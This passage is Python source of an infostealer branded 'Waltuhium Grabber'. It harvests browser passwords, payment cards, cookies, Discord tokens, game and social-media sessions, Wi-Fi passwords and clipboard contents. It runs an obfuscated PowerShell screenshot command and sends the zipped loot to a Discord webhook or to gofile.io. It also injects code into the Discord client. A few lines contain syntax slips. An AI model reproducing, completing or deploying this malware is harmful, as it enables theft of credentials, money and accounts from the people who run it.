                                avatar = player_data["avatarfull"]
                                timecreated = player_data["timecreated"]
                                if player_data["realname"]:
                                    realname = player_data["realname"]
                                else:realname = "None"
                                player_level = response2["response"]["player_level"]
                                embed_data = {
                                    "title": "***Waltuhium Grabber***",
                                    "description": f"***Waltuhium Steam Session Detected***",
                                    "url" : "https://github.com/waltuhium23/waltuhium",
                                    "color": 0,
                                    "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                                    "thumbnail": {"url": avatar}}
                                fields = [
                                        {"name": "Username", "value": "``" + str(personname) + "``", "inline": True},
                                        {"name": "Realname", "value": "``" + str(realname) + "``", "inline": True},
                                        {"name": "ID", "value": "``" +  str(steamid) + "``", "inline": True},
                                        {"name": "Timecreated", "value": "``" + str(timecreated) + "``", "inline": True},
                                        {"name": "Player Level", "value":"``" + str(player_level) + "``", "inline": True},
                                        {"name": "Profile URL", "value": "``" + str(profileurl) + "``", "inline": True},]
                                embed_data["fields"] = fields
                                async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                    payload = {
                                        "username": "waltuhium | t.me/waltuhium",
                                        "embeds": [embed_data]
                                    }
                                    headers = {
                                        "Content-Type": "application/json"
                                    }
                                    async with session.post(webhook, json=payload, headers=headers) as response:
                                        pass
        except Exception as e:
            print(e)            
    async def StealSteamSessionFiles(self, uuid:str) -> None:
        try:
            save_path = os.path.join(self.Temp, uuid)
            steam_path = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
            if os.path.isdir(steam_path):
                to_path = os.path.join(save_path, "Games", "Steam")
                if not os.path.isdir(to_path):
                    os.mkdir(to_path)
                shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
                with open(os.path.join(to_path, "How to Use.txt"),"w", errors="ignore", encoding="utf-8") as file:
                    file.write("https://t.me/waltuhium\n===========================================\nFirst close your steam and open this folder on your Computer, <C:\\Program Files (x86)\\Steam\\config>\nSecond Replace all this files with stolen Files\nFinally you can start steam.\n")
        except:
            return "null"
    
    async def WriteToText(self) -> None:
        try:
            cmd = "wmic csproduct get uuid"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            
            stdout, stderr = await process.communicate()
            output_lines = stdout.decode(errors="ignore").split("\n")
            uuid = output_lines[1].strip() if len(output_lines) > 1 else None
            filePath = os.path.join(self.Temp, uuid)
            if os.path.isdir(filePath):
                shutil.rmtree(filePath)
            os.mkdir(filePath)
            os.mkdir(os.path.join(filePath, "Browsers"))
            os.mkdir(os.path.join(filePath, "Sessions"))
            os.mkdir(os.path.join(filePath, "Tokens"))
            os.mkdir(os.path.join(filePath, "Games"))
            await self.GetWallets(filePath)
            await self.StealTelegramSession(filePath)
            await self.StealUplay(uuid)
            await self.StealEpicGames(uuid)
            await self.StealGrowtopia(uuid)
            await self.StealSteamSessionFiles(uuid)
            if len(os.listdir(os.path.join(filePath, "Games"))) == 0:
                try:
                    shutil.rmtree(os.path.join(filePath, "Games"))
                except:pass
            if self.FireFox:
                os.mkdir(os.path.join(filePath, "Browsers", "Firefox"))
            command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
            process = await asyncio.create_subprocess_shell(f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {command}",cwd=filePath,shell=True)
            await process.communicate() 
            password_list = Variables.Passwords
            card_list = Variables.Cards
            cookie_list = Variables.Cookies
            history_list = Variables.Historys
            bookmark_list = Variables.Bookmarks
            autofill_list = Variables.Autofills
            download_list = Variables.Downloads
            riot_acc = Variables.RiotGameAccounts
            insta_acc = Variables.InstagramAccounts
            twitter_acc = Variables.TwitterAccounts
            tiktok_acc = Variables.TikTokAccounts
            reddit_acc = Variables.RedditAccounts
            twitch_acc = Variables.TwtichAccounts
            spotify_acc = Variables.SpotifyAccounts
            steam_acc = Variables.SteamAccounts
            roblox_acc = Variables.RobloxAccounts

            processList = Variables.Processes
            if processList:
                with open(os.path.join(filePath, "process_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for proc in processList:
                        file.write(proc)
            if Variables.ClipBoard:
                with open(os.path.join(filePath, "last_clipboard.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for lstclip in Variables.ClipBoard:
                        file.write(lstclip)
            if self.FirefoxCookieList:
                with open(os.path.join(filePath, "Browsers", "Firefox", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for fcookie in self.FirefoxCookieList:
                        file.write(fcookie)
            if self.FirefoxHistoryList:
                with open(os.path.join(filePath, "Browsers", "Firefox", "History.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for fhistory in self.FirefoxHistoryList:
                        file.write(fhistory)
            if self.FirefoxAutofiList:
                with open(os.path.join(filePath, "Browsers", "Firefox", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.mew/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for fautofill in self.FirefoxAutofiList:
                        file.write(fautofill)
            if password_list:
                with open(os.path.join(filePath, "Browsers", "Passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for passwords in password_list:
                        file.write(passwords)
            if card_list:
                with open(os.path.join(filePath, "Browsers", "Cards.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for cards in card_list:
                        file.write(cards)
            if cookie_list:
                with open(os.path.join(filePath, "Browsers", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for cookies in cookie_list:
                        file.write(cookies)
            if history_list:
                with open(os.path.join(filePath, "Browsers", "Historys.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for historys in history_list:
                        file.write(historys)
            if autofill_list:
                with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for autofill in autofill_list:
                        file.write(autofill)
            if bookmark_list:
                with open(os.path.join(filePath, "Browsers", "Bookmarks.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for bookmark in bookmark_list:
                        file.write(bookmark)           
            if download_list:
                with open(os.path.join(filePath, "Browsers", "Downloads.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for downloads in download_list:
                        file.write(downloads)
            if riot_acc:
                with open(os.path.join(filePath, "Sessions", "riot_games.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for riotgames in riot_acc:
                        file.write(riotgames)
            if insta_acc:
                with open(os.path.join(filePath, "Sessions", "instagram_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for insta in insta_acc:
                        file.write(insta)
            if tiktok_acc:
                with open(os.path.join(filePath, "Sessions", "tiktok_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for tiktok in tiktok_acc:
                        file.write(tiktok)
            if twitter_acc:
                with open(os.path.join(filePath, "Sessions", "twitter_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for twitter in twitter_acc:
                        file.write(twitter)
            if reddit_acc:
                with open(os.path.join(filePath, "Sessions", "reddit_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for reddit in reddit_acc:
                        file.write(reddit)
            if twitch_acc:
                with open(os.path.join(filePath, "Sessions", "twitch_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for twitch in twitch_acc:
                        file.write(twitch)
            if spotify_acc:
                with open(os.path.join(filePath, "Sessions", "spotify_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for spotify in spotify_acc:
                        file.write(spotify)
            if roblox_acc:
                with open(os.path.join(filePath, "Sessions", "roblox_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for roblox in roblox_acc:
                        file.write(roblox)
            if steam_acc:
                with open(os.path.join(filePath, "Sessions", "steam_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for steam in steam_acc:
                        file.write(steam)
            if Variables.DiscordAccounts:
                with open(os.path.join(filePath, "Tokens", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for discord in Variables.DiscordAccounts:
                        file.write(discord)
            if Variables.FullTokens:
                with open(os.path.join(filePath, "Tokens", "full_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for token in Variables.FullTokens:
                        file.write(token + "\n")    
            if Variables.ValidatedTokens:
                with open(os.path.join(filePath, "Tokens", "validated_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for validated_token in Variables.ValidatedTokens:
                        file.write(validated_token + "\n")   
            if Variables.Wifis:
                with open(os.path.join(filePath, "wifi_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for profile_name, profile_password in Variables.Wifis:
                        file.write(f"WiFi Profile: {str(profile_name)}\nPassword: {str(profile_password)}\n\n")
            if Variables.SystemInfo:
                with open(os.path.join(filePath, "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for sysmteminfo in Variables.SystemInfo:
                        file.write(str(sysmteminfo))
            if Variables.Network:
                with open(os.path.join(filePath, "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.me/waltuhium----------------------\n"+ "=" * 70 + "\n")
                    for ip, country,city, timezone, isp in Variables.Network:
                        file.write(ip + "\n" + country + "\n" + city +"\n" + timezone + "\n" + isp) 
            if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
                try:
                    shutil.rmtree(os.path.join(filePath, "Sessions"))
                except:pass
            if len(os.listdir(os.path.join(filePath, "Tokens"))) == 0:
                try:
                    shutil.rmtree(os.path.join(filePath, "Tokens"))
                except:pass
            if len(os.listdir(os.path.join(filePath, "Browsers"))) == 0:
                try:
                    shutil.rmtree(os.path.join(filePath, "Browsers"))
                except:pass
        except:pass
    async def SendContains(self) -> None:
        try:
            cookie_keys = ""
            password_keys = ""
            autofill_keys = ""
            keywords = ["gmail.com", "live.com", "zoho.com", "tutanota.com", "trashmail.com", "gmx.net", "safe-mail.net", "thunderbird.net", "mail.lycos.com",    "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc",    "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev",    "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de",    "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com","accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com","ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com","hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com","xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl",    "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net",    "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com",    "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com",    "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "ekool.eu", "steamcommunity.com", "epicgames.com",    "0x00sec.org", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com",    "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io",    "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "play.tv3.ee", ".ope.ee", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today",    "moonx.gg", "novoline.lol", "twitch.tv"]
            for c in keywords:
                found_autofill = False 
                found_passw = False  
                found_cookie = False
                for auts in Variables.Autofills:
                    if c in auts:
                        found_autofill = True  
                        break  
                
                for pssw in Variables.Passwords:
                    if c in pssw:
                        found_passw = True  
                        break  
                
                for cooks in Variables.Cookies:
                    if c in cooks:
                        found_cookie = True
                        break  

                if found_autofill:
                    autofill_keys += c + ", "  
                
                if found_passw:
                    password_keys += c + ", "  
                
                if found_cookie:
                    cookie_keys += c + ", "
            if not cookie_keys:
                cookie_keys = None
            if not password_keys:
                password_keys = None
            if not autofill_keys:
                autofill_keys = None

            embed_data = {
                "title": "***Waltuhium Grabber***",
                "description": f"***Keyword Result***",
                "url" : "https://t.me/waltuhium",
                "color": 0,
                "footer": {"text": "https://t.me/waltuhium | https://github.com23/waltuhium"},
                "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
            fields = [
                {"name": "Passwords", "value": "```" + str(password_keys) + "```", "inline": False},
                {"name": "Autofills", "value": "```" +  str(autofill_keys) + "```", "inline": False},
                {"name": "Cookies", "value": "```" + str(cookie_keys) + "```", "inline": False},]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
                    "username": "waltuhium | t.me/waltuhium",
                    "embeds": [embed_data] }
                headers = {
                    "Content-Type": "application/json"}
                async with session.post(webhook, json=payload, headers=headers) as response:
                    pass
        except Exception as e:
            print(e)
    async def SendAllData(self) -> None:
        cmd = "wmic csproduct get uuid"
        process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            
        stdout, stderr = await process.communicate()
        output_lines = stdout.decode(errors="ignore").split("\n")
        uuid = output_lines[1].strip() if len(output_lines) > 1 else "NONE"
        filePath:str = os.path.join(self.Temp, uuid)
        shutil.make_archive(filePath, "zip", filePath)
        embed_data = {
            "title": "***Waltuhium Grabber***",
            "description": f"***Waltuhium Grabber Full Info***",
            "url" : "https://t.me/waltuhium",
            "color": 0,
            "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
            "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
        fields = [
             {"name": "Password", "value": "``" + str(len(Variables.Passwords)) + "``", "inline": True},
             {"name": "Card", "value": "``" + str(len(Variables.Cards)) + "``", "inline": True},
             {"name": "Cookie", "value": "``" +  str(len(Variables.Cookies) + len(self.FirefoxCookieList)) + "``", "inline": True},
             {"name": "History", "value": "``" + str(len(Variables.Historys) + len(self.FirefoxHistoryList)) + "``", "inline": True},
             {"name": "Download", "value":"``" + str(len(Variables.Downloads)) + "``", "inline": True},
             {"name": "Bookmark", "value": "``" + str(len(Variables.Bookmarks)) + "``", "inline": True},
             {"name": "Autofill", "value": "``" + str(len(Variables.Autofills) + len(self.FirefoxAutofiList)) + "``", "inline": True},
             {"name": "Tokens", "value": "``" + str(len(Variables.FullTokens)) + "``", "inline": True},
             {"name": "Instagram", "value": "``" + str(len(Variables.InstagramAccounts)) + "``", "inline": True},
             {"name": "Twitter", "value": "``" + str(len(Variables.TwitterAccounts)) + "``", "inline": True},
             {"name": "TikTok", "value": "``" + str(len(Variables.TikTokAccounts)) + "``", "inline": True},
             {"name": "Twitch", "value": "``" + str(len(Variables.TwtichAccounts)) + "``", "inline": True},
             {"name": "Reddit", "value": "``" + str(len(Variables.RedditAccounts)) + "``", "inline": True},
             {"name": "Spotify", "value": "``" + str(len(Variables.SpotifyAccounts)) + "``", "inline": True},
             {"name": "Riot Game's", "value": "``" + str(len(Variables.RiotGameAccounts)) + "``", "inline": True},
             {"name": "Roblox", "value": "``" + str(len(Variables.RobloxAccounts)) + "``", "inline": True},
             {"name": "Steam", "value": "``" + str(len(Variables.SteamAccounts)) + "``", "inline": True},
             {"name": "Wifi", "value": "``" + str(len(Variables.Wifis)) + "``", "inline": True},
             {"name": "FireFox?", "value": "``" + str(self.FireFox) + "``", "inline": True},]
        embed_data["fields"] = fields
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
            payload = {
                "username": "waltuhium | t.me/waltuhium",
                "embeds": [embed_data] }
            headers = {
                 "Content-Type": "application/json"}
            async with session.post(webhook, json=payload, headers=headers) as response:
                pass
            await self.SendContains()
            if not os.path.getsize(filePath + ".zip") / (1024 * 1024) > 15:
                with open(filePath + ".zip", 'rb') as file:
                    dosya_verisi = file.read()
                payload = aiohttp.FormData()
                payload.add_field('file', dosya_verisi, filename=os.path.basename(filePath + ".zip"))
                async with session.post(webhook, data=payload) as f:
                    pass
                del payload
                
            else:
                succes = await UploadGoFile.upload_file(filePath + ".zip")
                if succes != None:
                    embed_data2 = {
                        "title": "***Waltuhium Grabber***",
                        "description": f"***Waltuhium Grabber Full Info***",
                        "url" : "https://t.me/waltuhium",
                        "color": 0,
                        "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                        "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
                    fields2 = [{"name": "Download Link", "value": f"[{uuid}.zip]({succes})", "inline": True}]
                    embed_data2["fields"] = fields2
                    payload2 = {
                        "username": waltuhium | t.me/waltuhium",
                        "embeds": [embed_data2] }
                    async with session.post(webhook, json=payload2) as req:
                        pass
                else:print("file cannot uploaded to GoFile.")
            try:
                os.remove(filePath + ".zip")
                shutil.rmtree(filePath)
            except:
                pass
        
class UploadGoFile:
    @staticmethod
    async def GetServer() -> str:
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get("https://api.gofile.io/getServer") as request:
                    data = await request.json()
                    return data["data"]["server"]
        except Exception as e:
            print(f"An Error occurred while getting server: '{e}'\nit will use default server (store 1).")
            return "store1"
    @staticmethod
    async def upload_file(file_path: str) -> str:
        try:
            ActiveServer = await UploadGoFile.GetServer()
            upload_url = f"https://{ActiveServer}.gofile.io/uploadFile"
            async with aiohttp.ClientSession() as session:
                file_form = aiohttp.FormData()
                file_form.add_field('file', open(file_path, 'rb'), filename=os.path.basename(file_path))

                async with session.post(upload_url, data=file_form) as response:
                    response_body = await response.text()

                    raw_json = json.loads(response_body)
                    d = json.dumps(raw_json)
                    output = json.loads(d)

                    download_page = output['data']['downloadPage']
                    return download_page
        except Exception as e:
            print(f"An error occurred during file upload: '{e}'")
            return None


class DiscordInjection:
    def __init__(self) -> None:
        self.tokens = Variables.ValidatedTokens # stolen discord tokens for logout discord accounts
        self.already_killed = False
        self.LocalAppData = os.getenv("localappdata")
    async def InjectIntoToDiscord(self) -> None:
        try:
            if discord_injection:
                print("[+] Starting discord injection")
                discord_dirs = {
                        "Discord" : os.path.join(self.LocalAppData, "discord"),
                        "Discord Canary" : os.path.join(self.LocalAppData, "discordcanary"),
                        "Lightcord" : os.path.join(self.LocalAppData, "Lightcord"),
                        "Discord PTB" : os.path.join(self.LocalAppData, "discordptb"),
                    }
                injection_code = await self.GetInjectionCode()
                for f, file_paths in discord_dirs.items():
                    if os.path.exists(file_paths):
                        indexPath = await self.FindIndexPath(file_paths)
                        with open(indexPath, "r", encoding="utf-8", errors="ignore") as file:
                            if not webhook in file.read():
                                if not self.already_killed:
                                    await self.KillDiscord()
                                with open(indexPath, "w", encoding="utf-8", errors="ignore") as x:
                                    x.write(injection_code.replace("%WEBHOOK%",webhook))
                                command = os.path.join(file_paths, "Update.exe") + " --processStart Discord.exe"
                                result = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, shell=True)
                                await result.communicate()
                print("[+] Discord Injection was executed successfuly")  
        except Exception as error:
            print(f"[-] An error occured while injection to discord, error code => \"{error}\"")

    async def GetInjectionCode(self) -> str:
        try:
            async with aiohttp.ClientSession() as session:
